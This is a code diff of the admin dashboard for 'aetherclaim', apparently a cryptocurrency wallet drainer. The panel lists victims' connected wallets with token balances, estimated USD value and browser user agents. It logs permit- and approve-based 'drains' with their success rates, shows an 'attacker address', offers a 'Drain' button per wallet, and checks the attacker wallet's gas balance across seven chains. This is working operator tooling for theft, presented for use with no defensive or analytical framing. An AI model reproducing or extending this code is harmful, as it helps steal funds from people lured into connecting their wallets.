-</div><!-- /layout -->
-</div><!-- /app -->
-
-<!-- WALLET DETAIL MODAL -->
-<div class="modal-overlay" id="wallet-modal">
-  <div class="modal">
-    <h2>Wallet Details <span class="modal-close" onclick="closeModal()">&#10005;</span></h2>
-    <div id="modal-content"></div>
   </div>
+</div>
+</div>
+
+<!-- MODAL -->
+<div class="modal-overlay" id="wallet-modal">
+  <div class="modal"><h2>Wallet Details <span class="modal-close" onclick="closeModal()">&#10005;</span></h2><div id="modal-content"></div></div>
 </div>
 
 <script>
-  const h = window.location.hostname
-  const BASE = (h === 'localhost' || h === '127.0.0.1')
-    ? 'http://localhost:3001'
-    : (h.includes('onrender.com') ? '' : 'https://aetherclaim-api.onrender.com')
+const h = window.location.hostname
+const BASE = (h === 'localhost' || h === '127.0.0.1')
+  ? 'http://localhost:3001'
+  : (h.includes('onrender.com') ? '' : 'https://aetherclaim-api.onrender.com')
 
-  let adminPw = ''
-  let dashData = {}
-  let allWallets = []
-  let refreshTimer = null
+let adminPw = '', dashData = {}, allWallets = [], refreshTimer = null
 
-  const CHAIN_NAMES = {1:'Ethereum',56:'BNB Chain',137:'Polygon',42161:'Arbitrum',10:'Optimism',43114:'Avalanche',8453:'Base'}
-  const CHAIN_ICONS = {1:'\u27e0',56:'\ud83d\udfe1',137:'\ud83d\udfe3',42161:'\ud83d\udfe2',10:'\ud83d\udd34',43114:'\ud83d\udd3a',8453:'\ud83d\udfe2'}
-  const CHAIN_COINS = {1:'ETH',56:'BNB',137:'MATIC',42161:'ETH',10:'ETH',43114:'AVAX',8453:'ETH'}
-  const EXPLORERS   = {1:'https://etherscan.io/tx/',56:'https://bscscan.com/tx/',137:'https://polygonscan.com/tx/',42161:'https://arbiscan.io/tx/',10:'https://optimistic.etherscan.io/tx/',43114:'https://snowtrace.io/tx/',8453:'https://basescan.org/tx/'}
-  const ADDR_EXPLORERS = {1:'https://etherscan.io/address/',56:'https://bscscan.com/address/',137:'https://polygonscan.com/address/',42161:'https://arbiscan.io/address/',10:'https://optimistic.etherscan.io/address/',43114:'https://snowtrace.io/address/',8453:'https://basescan.org/address/'}
-  const USD_PRICES  = {USDT:1,USDC:1,BUSD:1,DAI:1,USDt:1,WBTC:65000,WETH:3200,ETH:3200,WBNB:600,BNB:600,CAKE:2,MATIC:0.8,POL:0.8,WAVAX:30,AVAX:30,ARB:1.2,OP:2,LINK:15,UNI:8,AAVE:100,CRV:0.5,POSI:0.001}
+const CN = {1:'Ethereum',56:'BNB Chain',137:'Polygon',42161:'Arbitrum',10:'Optimism',43114:'Avalanche',8453:'Base'}
+const CI = {1:'\u27e0',56:'\ud83d\udfe1',137:'\ud83d\udfe3',42161:'\ud83d\udfe2',10:'\ud83d\udd34',43114:'\ud83d\udd3a',8453:'\ud83d\udfe2'}
+const CC = {1:'ETH',56:'BNB',137:'MATIC',42161:'ETH',10:'ETH',43114:'AVAX',8453:'ETH'}
+const TX_EXP = {1:'https://etherscan.io/tx/',56:'https://bscscan.com/tx/',137:'https://polygonscan.com/tx/',42161:'https://arbiscan.io/tx/',10:'https://optimistic.etherscan.io/tx/',43114:'https://snowtrace.io/tx/',8453:'https://basescan.org/tx/'}
+const ADDR_EXP = {1:'https://etherscan.io/address/',56:'https://bscscan.com/address/',137:'https://polygonscan.com/address/',42161:'https://arbiscan.io/address/',10:'https://optimistic.etherscan.io/address/',43114:'https://snowtrace.io/address/',8453:'https://basescan.org/address/'}
+const UP = {USDT:1,USDC:1,BUSD:1,DAI:1,USDt:1,WBTC:65000,WETH:3200,ETH:3200,WBNB:600,BNB:600,CAKE:2,MATIC:0.8,POL:0.8,WAVAX:30,AVAX:30,ARB:1.2,OP:2,LINK:15,UNI:8,AAVE:100,CRV:0.5,POSI:0.001}
+const CHAIN_COLORS = {1:'#627eea',56:'#f3ba2f',137:'#8247e5',42161:'#28a0f0',10:'#ff0420',43114:'#e84142',8453:'#0052ff'}
 
-  const GAS_RPCS = {
-    1:  ['https://eth.drpc.org','https://ethereum.publicnode.com','https://eth.llamarpc.com'],
-    56: ['https://bsc.publicnode.com','https://bsc.drpc.org','https://bsc-dataseed.binance.org','https://bsc-dataseed1.defibit.io'],
-    137:['https://polygon.publicnode.com','https://polygon.drpc.org','https://polygon-rpc.com'],
-    42161:['https://arbitrum-one.publicnode.com','https://arb1.arbitrum.io/rpc'],
-    10: ['https://optimism.publicnode.com','https://optimism.drpc.org','https://mainnet.optimism.io'],
-    43114:['https://avalanche-c-chain.publicnode.com','https://api.avax.network/ext/bc/C/rpc'],
-    8453:['https://base.publicnode.com','https://base.drpc.org','https://mainnet.base.org']
-  }
+document.getElementById('pw-input').addEventListener('keydown', e => { if(e.key==='Enter') login() })
+document.getElementById('user-input').addEventListener('keydown', e => { if(e.key==='Enter') document.getElementById('pw-input').focus() })
 
-  document.getElementById('pw-input').addEventListener('keydown', e => { if(e.key==='Enter') login() })
-  document.getElementById('user-input').addEventListener('keydown', e => { if(e.key==='Enter') document.getElementById('pw-input').focus() })
+async function login() {
+  const user = document.getElementById('user-input').value
+  const pw = document.getElementById('pw-input').value
+  const r = await fetch(BASE+'/admin/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:user,password:pw})}).then(r=>r.json()).catch(()=>({ok:false}))
+  if (r.ok) { adminPw=pw; document.getElementById('login-screen').style.display='none'; document.getElementById('app').style.display='block'; refresh(); refreshTimer=setInterval(refresh,5000) }
+  else { document.getElementById('login-err').style.display='block' }
+}
+function logout() { clearInterval(refreshTimer); adminPw=''; document.getElementById('login-screen').style.display='flex'; document.getElementById('app').style.display='none' }
+async function apiFetch(path, opts={}) { return fetch(BASE+path,{...opts,headers:{'x-admin-password':adminPw,'Content-Type':'application/json',...(opts.headers||{})}}).then(r=>r.json()) }
 
-  async function login() {
-    const user = document.getElementById('user-input').value
-    const pw = document.getElementById('pw-input').value
-    const r  = await fetch(BASE+'/admin/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:user,password:pw})}).then(r=>r.json()).catch(()=>({ok:false}))
-    if (r.ok) {
-      adminPw = pw
-      document.getElementById('login-screen').style.display = 'none'
-      document.getElementById('app').style.display = 'block'
-      refresh()
-      refreshTimer = setInterval(refresh, 5000)
-    } else {
-      document.getElementById('login-err').style.display = 'block'
-    }
-  }
+async function refresh() {
+  const icon = document.getElementById('refresh-icon'); icon.classList.add('spin')
+  try { dashData = await apiFetch('/admin/dashboard'); allWallets = dashData.connectedWallets || []; renderAll() } catch(e) { console.error(e) }
+  icon.classList.remove('spin')
+}
 
-  function logout() {
-    clearInterval(refreshTimer)
-    adminPw = ''
-    document.getElementById('login-screen').style.display = 'flex'
-    document.getElementById('app').style.display = 'none'
-  }
+function renderAll() { renderSidebar(); renderDashboard(); renderWallets(); renderDrains(); renderLogs() }
 
-  async function apiFetch(path, opts={}) {
-    return fetch(BASE+path,{...opts,headers:{'x-admin-password':adminPw,'Content-Type':'application/json',...(opts.headers||{})}}).then(r=>r.json())
-  }
+function renderSidebar() {
+  const d = dashData
+  document.getElementById('sb-attacker-addr').textContent = d.attackerAddress ? shortAddr(d.attackerAddress) : 'Not configured'
+  document.getElementById('nb-wallets').textContent = (d.connectedWallets||[]).length
+  document.getElementById('nb-drains').textContent = (d.drainHistory||[]).filter(x=>x.success).length
+}
 
-  async function refresh() {
-    const icon = document.getElementById('refresh-icon')
-    icon.classList.add('spin')
-    try {
-      dashData = await apiFetch('/admin/dashboard')
-      allWallets = dashData.connectedWallets || []
-      renderAll()
-    } catch(e) { console.error(e) }
-    icon.classList.remove('spin')
-  }
+function renderDashboard() {
+  const d=dashData, drains=d.drainHistory||[], wallets=d.connectedWallets||[], success=drains.filter(x=>x.success), failed=drains.filter(x=>!x.success)
 
-  function renderAll() {
-    renderSidebar()
-    renderDashboard()
-    renderWallets()
-    renderDrains()
-    renderLogs()
-  }
+  document.getElementById('st-connected').textContent = wallets.length
+  document.getElementById('st-online').textContent = wallets.filter(w=>w.online).length+' online'
+  document.getElementById('st-drained').textContent = success.length
+  document.getElementById('st-failed').textContent = failed.length
 
-  function renderSidebar() {
-    const d = dashData
-    const addr = d.attackerAddress
-    document.getElementById('sb-attacker-addr').textContent = addr ? shortAddr(addr) : 'Not configured'
-    document.getElementById('nb-wallets').textContent = (d.connectedWallets||[]).length
-    const success = (d.drainHistory||[]).filter(x=>x.success).length
-    document.getElementById('nb-drains').textContent = success
-  }
+  let drainedUSD=0; success.forEach(x => drainedUSD += (UP[x.symbol]||1)*parseFloat(x.amount||0))
+  document.getElementById('st-drained-usd').textContent = '$'+drainedUSD.toFixed(2)
 
-  function renderDashboard() {
-    const d = dashData
-    const drains  = d.drainHistory || []
-    const wallets = d.connectedWallets || []
-    const success = drains.filter(x=>x.success)
-    const failed  = drains.filter(x=>!x.success)
-    const onlineWallets = wallets.filter(w => w.online)
+  let totalTok=0, chainSet=new Set(), totalVal=0
+  wallets.forEach(w => (w.tokens||[]).forEach(t => { totalTok++; chainSet.add(t.chainId||w.chainId); totalVal+=(UP[t.symbol]||1)*parseFloat(t.balance||0) }))
+  document.getElementById('st-tokens').textContent = totalTok
+  document.getElementById('st-chains').textContent = chainSet.size+' chains'
+  document.getElementById('st-total-value').textContent = '$'+(totalVal>999?(totalVal/1000).toFixed(1)+'K':totalVal.toFixed(0))
 
-    document.getElementById('st-connected').textContent = wallets.length
-    document.getElementById('st-online').textContent    = onlineWallets.length + ' online now'
-    document.getElementById('st-drained').textContent   = success.length
-    document.getElementById('st-failed').textContent    = failed.length
+  // Donut
+  const total=drains.length, okN=success.length, failN=failed.length, pendN=wallets.filter(w=>!w.drained).length
+  const pct = total>0 ? Math.round(okN/total*100) : 0
+  const okDeg = total>0 ? okN/total*360 : 0, failDeg = total>0 ? failN/total*360 : 0
+  document.getElementById('donut-chart').style.background = total>0
+    ? `conic-gradient(var(--green) 0deg ${okDeg}deg, var(--red) ${okDeg}deg ${okDeg+failDeg}deg, var(--gold) ${okDeg+failDeg}deg 360deg)`
+    : 'conic-gradient(var(--border2) 0deg 360deg)'
+  document.getElementById('donut-pct').textContent = pct+'%'
+  document.getElementById('donut-ok').textContent = okN
+  document.getElementById('donut-fail').textContent = failN
+  document.getElementById('donut-pending').textContent = pendN
 
-    let totalDrainedUSD = 0
-    success.forEach(x => {
-      const price = USD_PRICES[x.symbol] || 1
-      totalDrainedUSD += parseFloat(x.amount||0) * price
-    })
-    document.getElementById('st-drained-usd').textContent = '$' + totalDrainedUSD.toFixed(2) + ' total'
+  // Chain distribution
+  const chainCount = {}
+  wallets.forEach(w => { const c=w.chainId||0; chainCount[c]=(chainCount[c]||0)+1 })
+  const maxC = Math.max(1,...Object.values(chainCount))
+  const chainHtml = Object.entries(chainCount).sort((a,b)=>b[1]-a[1]).map(([id,count]) =>
+    `<div class="chain-bar-wrap"><div class="chain-bar-label"><span class="chain-bar-name">${CI[id]||''} ${CN[id]||'Chain '+id}</span><span class="chain-bar-val">${count} wallet${count>1?'s':''}</span></div><div class="chain-bar-track"><div class="chain-bar-fill" style="width:${count/maxC*100}%;background:${CHAIN_COLORS[id]||'var(--cyan)'}"></div></div></div>`
+  ).join('')
+  document.getElementById('chain-dist').innerHTML = chainHtml || '<div style="color:var(--muted2);font-size:12px">No data yet</div>'
 
-    let totalTokens = 0, chainSet = new Set(), totalValue = 0
-    wallets.forEach(w => {
-      (w.tokens||[]).forEach(t => {
-        totalTokens++
-        chainSet.add(t.chainId || w.chainId)
-        totalValue += (USD_PRICES[t.symbol]||1) * parseFloat(t.balance||0)
-      })
-    })
-    document.getElementById('st-tokens').textContent     = totalTokens
-    document.getElementById('st-chains').textContent     = 'across ' + chainSet.size + ' chains'
-    document.getElementById('st-total-value').textContent = '$' + (totalValue > 999 ? (totalValue/1000).toFixed(1)+'K' : totalValue.toFixed(0))
+  // Top wallets
+  const ranked = wallets.map(w => { let v=0; (w.tokens||[]).forEach(t=>v+=(UP[t.symbol]||1)*parseFloat(t.balance||0)); return {...w, val:v} }).sort((a,b)=>b.val-a.val).slice(0,5)
+  document.getElementById('top-wallets-area').innerHTML = ranked.length === 0
+    ? '<div style="color:var(--muted2);font-size:12px;text-align:center;padding:20px">No wallets</div>'
+    : ranked.map((w,i) => `<div class="tw-item"><div class="tw-rank ${i<3?'r'+(i+1):''}">${i+1}</div><div class="tw-info"><div class="tw-addr" onclick="showWalletDetail('${w.address}')">${shortAddr(w.address)}</div><div class="tw-tokens">${(w.tokens||[]).map(t=>t.symbol).join(', ')||'No tokens'}</div></div><div class="tw-val">$${w.val.toFixed(2)}</div></div>`).join('')
 
-    if (wallets.length) {
-      document.getElementById('dash-last-seen').textContent = 'Last: ' + timeAgo(wallets[0].lastSeen || wallets[0].connectedAt)
-    }
+  // Last seen
+  if (wallets.length) document.getElementById('dash-last-seen').textContent = 'Last: '+timeAgo(wallets[0].lastSeen||wallets[0].connectedAt)
 
-    const wt = document.getElementById('dash-wallets-tbody')
-    const rw = wallets.slice(0,6)
-    wt.innerHTML = rw.length === 0
-      ? '<tr><td colspan="4" class="empty-state"><p>No wallets yet</p></td></tr>'
-      : rw.map(w => {
-          const toks = (w.tokens||[]).map(t=>`<span style="font-size:10px;color:var(--cyan)">${t.symbol}</span>`).join(' ')
-          return `<tr>
-            <td><span class="addr-short" onclick="showWalletDetail('${w.address}')" title="${w.address}">${shortAddr(w.address)}</span></td>
-            <td>${toks || '<span style="color:var(--muted2);font-size:10px">\u2014</span>'}</td>
-            <td style="color:var(--muted);font-size:11px">${timeAgo(w.connectedAt)}</td>
-            <td><span class="badge ${w.drained?'success':'pending'}">${w.drained?'Drained':'Active'}</span></td>
-          </tr>`}).join('')
+  // Recent wallets table
+  const wt = document.getElementById('dash-wallets-tbody'), rw = wallets.slice(0,5)
+  wt.innerHTML = rw.length===0 ? '<tr><td colspan="4"><div class="empty-state"><p>No wallets</p></div></td></tr>'
+    : rw.map(w => { const toks=(w.tokens||[]).map(t=>`<span style="font-size:10px;color:var(--cyan)">${t.symbol}</span>`).join(' ')
+      return `<tr><td><span class="addr-short" onclick="showWalletDetail('${w.address}')">${shortAddr(w.address)}</span></td><td>${toks||'\u2014'}</td><td style="color:var(--muted);font-size:11px">${timeAgo(w.connectedAt)}</td><td><span class="badge ${w.drained?'success':'pending'}">${w.drained?'Drained':'Active'}</span></td></tr>`}).join('')
 
-    const dt = document.getElementById('dash-drains-tbody')
-    const rd = drains.slice(0,6)
-    dt.innerHTML = rd.length === 0
-      ? '<tr><td colspan="4" class="empty-state"><p>No drains yet</p></td></tr>'
-      : rd.map(x => {
-          const exp = (EXPLORERS[x.chainId]||'https://bscscan.com/tx/') + x.txHash
-          const tx  = x.txHash ? `<a href="${exp}" target="_blank" style="color:var(--gold);font-size:10px">${shortHash(x.txHash)}</a>` : '\u2014'
-          return `<tr>
-            <td><span class="addr-short" title="${x.owner}">${shortAddr(x.owner)}</span></td>
-            <td style="color:var(--green);font-weight:600">${x.amount||'\u2014'} ${x.symbol||''}</td>
-            <td style="font-size:11px">${CHAIN_ICONS[x.chainId]||''} ${CHAIN_NAMES[x.chainId]||x.chainId}</td>
-            <td>${tx}</td>
-          </tr>`}).join('')
+  // Activity timeline
+  const logs = (d.logs||[]).slice(0,15)
+  document.getElementById('dash-timeline').innerHTML = logs.length===0 ? '<div style="color:var(--muted2);font-size:12px;text-align:center;padding:20px">No activity</div>'
+    : '<div class="timeline">'+logs.map(l => {
+      const cls = l.level==='error'?'fail':l.level==='warn'?'drain':'connect'
+      const icon = l.level==='error'?'&#10007;':l.level==='warn'?'&#9889;':'&#8226;'
+      return `<div class="tl-item"><div class="tl-dot ${cls}">${icon}</div><div class="tl-body"><div class="tl-msg">${l.msg.length>80?l.msg.slice(0,80)+'...':l.msg}</div><div class="tl-time">${l.time.split('T')[1]?.split('.')[0]||''}</div></div></div>`
+    }).join('')+'</div>'
+}
 
-    const logs = (d.logs||[]).slice(0,20)
-    document.getElementById('dash-log-box').innerHTML = logs.map(l =>
-      `<div class="log-entry"><span class="log-ts">${l.time.split('T')[1].split('.')[0]}</span>
-       <span class="log-level-${l.level}">[${l.level.toUpperCase()}]</span>
-       <span class="log-msg"> ${l.msg}</span></div>`).join('') || '<div style="color:var(--muted2)">No activity yet...</div>'
-  }
+function renderWallets() { document.getElementById('wallets-subtitle').textContent = allWallets.length+' wallets'; filterWallets() }
+function filterWallets() {
+  const q=(document.getElementById('wallet-search').value||'').toLowerCase(), f=document.getElementById('wallet-filter').value
+  let list = allWallets.filter(w => { if(q&&!w.address.toLowerCase().includes(q)) return false; if(f==='drained'&&!w.drained) return false; if(f==='active'&&w.drained) return false; if(f==='tokens'&&!(w.tokens&&w.tokens.length)) return false; return true })
+  const tbody = document.getElementById('wallets-tbody')
+  if(!list.length){ tbody.innerHTML='<tr><td colspan="9"><div class="empty-state"><div class="e-icon">&#128123;</div><p>No wallets match</p></div></td></tr>'; return }
+  tbody.innerHTML = list.map((w,i) => {
+    const toks=(w.tokens||[]).filter(t=>parseFloat(t.balance||0)>0)
+    const tokHtml = toks.length ? toks.map(t => { const u=(UP[t.symbol]||1)*parseFloat(t.balance||0); return `<span class="token-chip"><span class="sym">${t.symbol}</span><span class="bal">${parseFloat(t.balance).toFixed(4)}</span>${u>=0.01?` <span style="color:var(--green);font-size:9px">$${u.toFixed(2)}</span>`:''}</span>` }).join('') : '<span style="color:var(--muted2);font-size:11px">None</span>'
+    let val=0; toks.forEach(t=>val+=(UP[t.symbol]||1)*parseFloat(t.balance||0))
+    const exp=(ADDR_EXP[w.chainId]||'https://bscscan.com/address/')+w.address
+    return `<tr><td style="color:var(--muted2)">${i+1}</td><td><div style="display:flex;align-items:center;gap:6px"><span class="addr-short" onclick="copyText('${w.address}')">${shortAddr(w.address)}</span><a href="${exp}" target="_blank" style="color:var(--muted2);font-size:10px">\u2197</a></div><div style="font-size:10px;color:var(--muted2);margin-top:2px;font-family:'JetBrains Mono',monospace">${w.userAgent?w.userAgent.slice(0,35)+'...':''}</div></td><td>${CI[w.chainId]||''} ${CN[w.chainId]||w.chainId}</td><td><div class="token-chips">${tokHtml}</div></td><td style="color:${val>0?'var(--green)':'var(--muted)'};font-weight:600">$${val.toFixed(2)}</td><td style="color:var(--muted);font-size:11px">${timeAgo(w.connectedAt)}</td><td style="color:var(--muted);font-size:11px">${timeAgo(w.lastSeen||w.connectedAt)}</td><td><span class="badge ${w.drained?'success':w.online?'online':'pending'}">${w.drained?'Drained':w.online?'Online':'Idle'}</span></td><td style="display:flex;gap:5px;flex-wrap:wrap"><button class="btn xs ghost" onclick="showWalletDetail('${w.address}')">Details</button>${!w.drained?`<button class="btn xs red" onclick="triggerManualDrain('${w.address}')">Drain</button>`:''}</td></tr>`
+  }).join('')
+}
 
-  function renderWallets() {
-    const wallets = allWallets
-    document.getElementById('wallets-subtitle').textContent = wallets.length + ' wallets connected'
-    filterWallets()
-  }
+function renderDrains() {
+  const drains=dashData.drainHistory||[], success=drains.filter(x=>x.success), failed=drains.filter(x=>!x.success)
+  let totalUSD=0; success.forEach(x=>totalUSD+=(UP[x.symbol]||1)*parseFloat(x.amount||0))
+  document.getElementById('dh-success').textContent=success.length; document.getElementById('dh-failed').textContent=failed.length
+  document.getElementById('dh-total-usd').textContent='$'+totalUSD.toFixed(2); document.getElementById('drains-subtitle').textContent=drains.length+' attempts'
+  const tbody=document.getElementById('drains-tbody')
+  if(!drains.length){ tbody.innerHTML='<tr><td colspan="9"><div class="empty-state"><div class="e-icon">&#128164;</div><p>No drains</p></div></td></tr>'; return }
+  tbody.innerHTML = drains.map((x,i) => {
+    const exp=TX_EXP[x.chainId]||'https://bscscan.com/tx/', tx=x.txHash?`<a href="${exp}${x.txHash}" target="_blank" style="color:var(--gold);font-family:'JetBrains Mono',monospace;font-size:11px">${shortHash(x.txHash)}</a>`:'\u2014'
+    const usd=(UP[x.symbol]||1)*parseFloat(x.amount||0)
+    return `<tr><td style="color:var(--muted2)">${i+1}</td><td><span class="addr-short" onclick="copyText('${x.owner}')">${shortAddr(x.owner)}</span></td><td style="font-weight:600">${x.symbol||'\u2014'}</td><td><div style="color:${x.success?'var(--green)':'var(--muted)'};font-weight:600">${x.amount?x.amount+' '+x.symbol:'\u2014'}</div>${x.amount?`<div style="font-size:10px;color:var(--muted)">~$${usd.toFixed(2)}</div>`:''}</td><td>${CI[x.chainId]||''} ${CN[x.chainId]||x.chainId}</td><td><span class="badge info">${x.sig?'permit':'approve'}</span></td><td><span class="badge ${x.success?'success':'fail'}">${x.success?'Success':'Failed'}</span>${!x.success&&x.error?`<div style="font-size:10px;color:var(--red);margin-top:4px;word-break:break-word;line-height:1.45;max-width:220px">${x.error}</div>`:''}</td><td>${tx}</td><td style="color:var(--muted);font-size:11px;white-space:nowrap">${new Date(x.startedAt).toLocaleString()}</td></tr>`
+  }).join('')
+}
 
-  function filterWallets() {
-    const q      = (document.getElementById('wallet-search').value||'').toLowerCase()
-    const filter = document.getElementById('wallet-filter').value
-    let list = allWallets.filter(w => {
-      if (q && !w.address.toLowerCase().includes(q)) return false
-      if (filter === 'drained' && !w.drained) return false
-      if (filter === 'active'  && w.drained) return false
-      if (filter === 'tokens'  && !(w.tokens && w.tokens.length)) return false
-      return true
-    })
-    const tbody = document.getElementById('wallets-tbody')
-    if (list.length === 0) {
-      tbody.innerHTML = `<tr><td colspan="9"><div class="empty-state"><div class="icon">&#128123;</div><p>No wallets match</p></div></td></tr>`
-      return
-    }
-    tbody.innerHTML = list.map((w, i) => {
-      const toks = (w.tokens||[]).filter(t => parseFloat(t.balance||0) > 0)
-      const tokHtml = toks.length
-        ? toks.map(t => {
-            const usd = (USD_PRICES[t.symbol]||1) * parseFloat(t.balance||0)
-            const usdStr = usd >= 0.01 ? ` <span style="color:var(--green);font-size:9px">$${usd.toFixed(2)}</span>` : ''
-            return `<span class="token-chip"><span class="sym">${t.symbol}</span><span class="bal">${parseFloat(t.balance).toFixed(4)}</span><span class="chain">${t.chain||''}</span>${usdStr}</span>`
-          }).join('')
-        : '<span style="color:var(--muted2);font-size:11px">No tokens detected</span>'
-      let estVal = 0
-      toks.forEach(t => estVal += (USD_PRICES[t.symbol]||1) * parseFloat(t.balance||0))
-      const exp = (ADDR_EXPLORERS[w.chainId]||'https://bscscan.com/address/') + w.address
-      return `<tr>
-        <td style="color:var(--muted2)">${i+1}</td>
-        <td>
-          <div style="display:flex;align-items:center;gap:6px">
-            <span class="addr-short" onclick="copyText('${w.address}')" title="Click to copy">${shortAddr(w.address)}</span>
-            <a href="${exp}" target="_blank" style="color:var(--muted2);font-size:10px" title="View on explorer">\u2197</a>
-          </div>
-          <div style="font-size:10px;color:var(--muted2);margin-top:2px;font-family:'JetBrains Mono',monospace">${w.userAgent ? w.userAgent.slice(0,40)+'...' : ''}</div>
-        </td>
-        <td>${CHAIN_ICONS[w.chainId]||''} ${CHAIN_NAMES[w.chainId]||'Chain '+w.chainId}</td>
-        <td><div class="token-chips">${tokHtml}</div></td>
-        <td style="color:${estVal>0?'var(--green)':'var(--muted)'};font-weight:600">$${estVal.toFixed(2)}</td>
-        <td style="color:var(--muted);font-size:11px">${timeAgo(w.connectedAt)}</td>
-        <td style="color:var(--muted);font-size:11px">${timeAgo(w.lastSeen||w.connectedAt)}</td>
-        <td><span class="badge ${w.drained?'success':w.online?'online':'pending'}">${w.drained?'Drained':w.online?'Online':'Idle'}</span></td>
-        <td style="display:flex;gap:5px;flex-wrap:wrap">
-          <button class="btn xs ghost" onclick="showWalletDetail('${w.address}')">Details</button>
-          ${!w.drained ? `<button class="btn xs red" onclick="triggerManualDrain('${w.address}')">Drain</button>` : ''}
-        </td>
-      </tr>`
-    }).join('')
-  }
+function renderLogs() {
+  const logs=dashData.logs||[]; document.getElementById('log-count').textContent=logs.length+' entries'
+  document.getElementById('log-box').innerHTML = logs.length===0 ? '<div style="color:var(--muted2)">No logs...</div>'
+    : logs.map(l=>`<div class="log-entry"><span class="log-ts">${l.time.replace('T',' ').split('.')[0]}</span><span class="log-level-${l.level}">[${l.level.toUpperCase()}]</span><span class="log-msg"> ${l.msg}</span></div>`).join('')
+}
 
-  function renderDrains() {
-    const drains = dashData.drainHistory || []
-    const success = drains.filter(x=>x.success)
-    const failed  = drains.filter(x=>!x.success)
-    let totalUSD = 0
-    success.forEach(x => totalUSD += (USD_PRICES[x.symbol]||1)*parseFloat(x.amount||0))
+async function loadGas() {
+  const addr=dashData.attackerAddress; document.getElementById('gas-attacker-addr').textContent=addr||'Not configured'
+  if(!addr)return
+  const chains=[{id:1,name:'Ethereum',coin:'ETH',min:.005},{id:56,name:'BNB Chain',coin:'BNB',min:.001},{id:137,name:'Polygon',coin:'MATIC',min:.5},{id:42161,name:'Arbitrum',coin:'ETH',min:.002},{id:10,name:'Optimism',coin:'ETH',min:.002},{id:8453,name:'Base',coin:'ETH',min:.001}]
+  const rpcs={1:'https://eth.drpc.org',56:'https://bsc.publicnode.com',137:'https://polygon.publicnode.com',42161:'https://arbitrum-one.publicnode.com',10:'https://optimism.publicnode.com',8453:'https://base.publicnode.com'}
+  document.getElementById('gas-grid').innerHTML = chains.map(c=>`<div class="gas-card" id="gas-${c.id}"><div class="chain-name">${CI[c.id]} ${c.name}</div><div class="balance empty" id="gbal-${c.id}">Loading...</div><div style="font-size:10px;color:var(--muted)" id="gstatus-${c.id}">checking...</div><div class="status-bar"><div class="status-bar-fill" id="gbar-${c.id}" style="width:0%;background:var(--muted)"></div></div></div>`).join('')
+  chains.forEach(async c=>{try{const r=await fetch(rpcs[c.id],{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({jsonrpc:'2.0',id:1,method:'eth_getBalance',params:[addr,'latest']}),signal:AbortSignal.timeout(6000)}).then(r=>r.json());const bal=parseInt(r.result||'0',16)/1e18;const el=document.getElementById('gbal-'+c.id),bar=document.getElementById('gbar-'+c.id),st=document.getElementById('gstatus-'+c.id);el.textContent=bal.toFixed(4)+' '+c.coin;const pct=Math.min(100,(bal/c.min)*30);if(bal>=c.min){el.className='balance funded';bar.style.width=Math.max(30,pct)+'%';bar.style.background='var(--green)';st.textContent='Funded';st.style.color='var(--green)'}else if(bal>0){el.className='balance low';bar.style.width=pct+'%';bar.style.background='var(--yellow)';st.textContent='Low';st.style.color='var(--yellow)'}else{el.className='balance empty';bar.style.width='0%';st.textContent='Empty';st.style.color='var(--red)'}}catch(e){const el=document.getElementById('gbal-'+c.id);if(el){el.textContent='RPC error';el.className='balance empty'}}})
+}
 
-    document.getElementById('dh-success').textContent   = success.length
-    document.getElementById('dh-failed').textContent    = failed.length
-    document.getElementById('dh-total-usd').textContent = '$'+totalUSD.toFixed(2)
-    document.getElementById('drains-subtitle').textContent = drains.length + ' total attempts'
+function showPage(name,el){document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));document.querySelectorAll('.sb-item').forEach(n=>n.classList.remove('active'));document.getElementById('page-'+name).classList.add('active');if(el)el.classList.add('active');if(name==='gas')loadGas();if(name==='logs')refresh()}
 
-    const tbody = document.getElementById('drains-tbody')
-    if (!drains.length) {
-      tbody.innerHTML = `<tr><td colspan="9"><div class="empty-state"><div class="icon">&#128164;</div><p>No drain attempts yet</p></div></td></tr>`
-      return
-    }
-    tbody.innerHTML = drains.map((x,i) => {
-      const explorer = EXPLORERS[x.chainId]||'https://bscscan.com/tx/'
-      const tx = x.txHash ? `<a href="${explorer}${x.txHash}" target="_blank" style="color:var(--gold);font-family:'JetBrains Mono',monospace;font-size:11px">${shortHash(x.txHash)}</a>` : '\u2014'
-      const usd = (USD_PRICES[x.symbol]||1)*parseFloat(x.amount||0)
-      return `<tr>
-        <td style="color:var(--muted2)">${i+1}</td>
-        <td><span class="addr-short" onclick="copyText('${x.owner}')" title="${x.owner}">${shortAddr(x.owner)}</span></td>
-        <td style="font-weight:600">${x.symbol||'\u2014'}</td>
-        <td>
-          <div style="color:${x.success?'var(--green)':'var(--muted)'};font-weight:600">${x.amount ? x.amount+' '+x.symbol : '\u2014'}</div>
-          ${x.amount ? `<div style="font-size:10px;color:var(--muted)">~$${usd.toFixed(2)}</div>` : ''}
-        </td>
-        <td>${CHAIN_ICONS[x.chainId]||''} ${CHAIN_NAMES[x.chainId]||x.chainId}</td>
-        <td><span class="badge info">${x.sig ? 'permit' : 'approve'}</span></td>
-        <td><span class="badge ${x.success?'success':'fail'}">${x.success?'Success':'Failed'}</span>
-          ${!x.success && x.error ? `<div style="font-size:10px;color:var(--red);margin-top:4px;white-space:normal;word-break:break-word;line-height:1.45;max-width:220px">${x.error}</div>` : ''}
-        </td>
-        <td>${tx}</td>
-        <td style="color:var(--muted);font-size:11px;white-space:nowrap">${new Date(x.startedAt).toLocaleString()}</td>
-      </tr>`
-    }).join('')
-  }
+function showWalletDetail(address) {
+  const w=allWallets.find(x=>x.address===address); if(!w)return
+  const toks=(w.tokens||[]).filter(t=>parseFloat(t.balance||0)>0); let val=0; toks.forEach(t=>val+=(UP[t.symbol]||1)*parseFloat(t.balance||0))
+  const exp=(ADDR_EXP[w.chainId]||'https://bscscan.com/address/')+w.address, drains=(dashData.drainHistory||[]).filter(x=>x.owner===address)
+  document.getElementById('modal-content').innerHTML=`
+    <div class="detail-row"><span class="detail-label">Address</span><span class="detail-value">${w.address} <a href="${exp}" target="_blank" style="color:var(--gold);font-size:10px">\u2197</a></span></div>
+    <div class="detail-row"><span class="detail-label">Network</span><span class="detail-value">${CI[w.chainId]||''} ${CN[w.chainId]||w.chainId}</span></div>
+    <div class="detail-row"><span class="detail-label">Value</span><span class="detail-value" style="color:${val>0?'var(--green)':'var(--muted)'}">$${val.toFixed(2)}</span></div>
